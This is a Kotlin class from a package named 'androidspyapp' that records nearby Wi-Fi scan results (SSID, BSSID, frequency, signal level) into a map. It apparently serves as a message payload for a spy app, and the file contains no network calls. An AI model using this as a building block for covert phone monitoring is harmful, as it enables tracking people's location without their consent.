package com.komnacki.androidspyapp

import android.content.Context
import android.net.wifi.ScanResult
import android.util.Log

class WifiScanResult(override var context: Context, scanResult: ScanResult?) : Message {
    init {
        getWifiResults (
            scanResult
        )
    }

    private lateinit var info : MutableMap<String, Any>

    private fun getWifiResults(scanResult: ScanResult?) {
        if(scanResult != null) {
            try {
                info = mutableMapOf()
                info["CAPABILITIES"] = scanResult.capabilities
                info["SSID"] = scanResult.SSID
                info["BSSID"] = scanResult.BSSID
                info["FREQUENCY"] = scanResult.frequency
                info["LEVEL"] = scanResult.level
            } catch (e: Exception) {
                Log.e("KK: ", "EXCEPTION during save fields for wifi in WifiScanResult: " + e.cause + ", " + e.message)
            }
        } else {
            Log.e("KK: ", "EXCEPTION during save fields for wifi in WifiScanResult: " + "Scan result == null")
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }

    fun getWifiName() : String {
        val ssid = info["SSID"]
        return if(ssid != null) {
            val wifiName: String = ssid as String
            if (!wifiName.isBlank()) {
                wifiName
            } else {
                "Unknown_" + System.currentTimeMillis()
            }
        } else {
            "Unknown_" + System.currentTimeMillis()
        }
    }
}